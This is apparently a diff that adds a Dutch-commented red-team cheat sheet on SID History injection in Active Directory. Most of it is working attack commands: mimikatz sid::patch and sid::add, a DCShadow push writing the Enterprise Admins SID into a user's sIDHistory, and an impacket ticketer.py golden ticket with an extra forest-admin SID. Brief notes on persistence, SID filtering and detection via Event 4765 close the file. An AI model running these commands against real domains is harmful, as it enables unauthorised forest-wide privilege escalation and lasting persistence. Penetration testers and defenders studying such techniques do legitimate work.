@@ -1,0 +1,30 @@
+# SID History Injection — Enterprise Admin SID toevoegen aan user
+# SID History wordt gebruikt bij domeinmigraties
+# Geïnjecteerde SIDs worden meegenomen in Kerberos tickets
+#
+# === Vereisten ===
+# - Domain Admin rechten
+# - Of DCSync + ticket forgery mogelijkheid
+#
+# === Voorbeelden ===
+
+# Via Mimikatz (vereist Domain Admin)
+mimikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:targetuser /new:S-1-5-21-DOMAIN-519" exit
+# S-1-5-21-DOMAIN-519 = Enterprise Admins SID
+
+# Via DCShadow (stealthier)
+# Terminal 1 (SYSTEM):
+mimikatz.exe "lsadump::dcshadow /object:targetuser /attribute:SIDHistory /value:S-1-5-21-DOMAIN-519"
+# Terminal 2 (DA):
+mimikatz.exe "lsadump::dcshadow /push"
+
+# Via Golden Ticket met extra SIDs (cross-forest)
+python3 ticketer.py -nthash KRBTGT_HASH -domain-sid CHILD_SID -domain CHILD_DOMAIN -extra-sid S-1-5-21-PARENT_SID-519 Administrator
+
+# Verifieer SID History
+powershell -c "Get-ADUser targetuser -Properties SIDHistory | Select SIDHistory"
+
+# Noot: SID History overleeft Golden Ticket rotatie
+# Noot: SID-Filtering blokkeert cross-forest SID History (maar niet binnen forest)
+# Noot: Detectie: Event 4765 (SID History added), monitor sIDHistory attribuut
+# Noot: Enterprise Admins SID (519) geeft volledige forest controle
